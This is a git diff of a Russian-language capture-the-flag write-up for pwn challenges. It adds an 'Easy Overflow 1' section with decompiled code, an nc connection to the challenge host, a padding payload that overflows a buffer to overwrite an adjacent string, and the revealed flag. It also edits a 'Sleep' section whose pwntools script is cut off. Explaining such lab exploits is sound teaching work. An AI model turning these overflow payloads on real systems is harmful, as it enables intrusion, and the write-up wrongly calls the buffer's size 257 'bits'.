@@ -1,8 +1,41 @@
 # PWN. Analysis of tasks solving from forkbomb
-
+* Easy Overflow 1
 * Sleep
 * Auto Overflow 1
 
+## Easy Overflow 1
+Откроем исполняемый файл в Cutter, посмотрим на `main` и увидим следующий код:
+```
+    undefined4 dbg.main(void)
+    {
+        int32_t iVar1;
+        int var_120h;
+        int var_11ch;
+        char word [257];
+        char giveflag [5];
+        
+        // int main();
+        stack0xfffffffffffffff4 = 0;
+        giveflag._0_4_ = 0x2e6f4e;
+        printf("What\'s your favorite word? ");
+        scanf(data.004006c4, word);
+        iVar1 = strcmp(giveflag, "Yesss!");
+        if (iVar1 == 0) {
+            printf("Flag is: spbctf{*********************}\n");
+        } else {
+            printf("Good, but i won\'t give you flag.\n");
+        }
+        return stack0xfffffffffffffff4;
+    }
+```
+Заметим, что переменная `giveflag` объявляется сразу после `word`, которая занимает 257 бит. Тогда отправим 264 "мусорных байта", а затем строку Yesss!
+```
+nc 109.233.56.90 11584
+```
+```
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacYesss!
+```
+После чего получаем флаг **spbctf{babys_f1rst_0verfl0ww}**
 ## Sleep
 Откроем исполняемчый файл в Cutter и в функции `main` увидим следующее:
 ```
@@ -112,7 +145,7 @@ undefined4 main(void)
     return 0;
 }
 ```
-Проведя анализ, понимаем, что нужно менее чем за 1 секунду отправить 64 "мусорных байта", а затем изменить строку на требуюмую. Это можно сдлеать при помощи всеми любимого `pwntools`:
+Проведя анализ, понимаем, что нужно менее чем за 1 секунду отправить 64 "мусорных байта", а затем изменить строку на требуюмую. Это можно сдлеать при помощи `pwntools`:
 ```
 from pwn import *
 
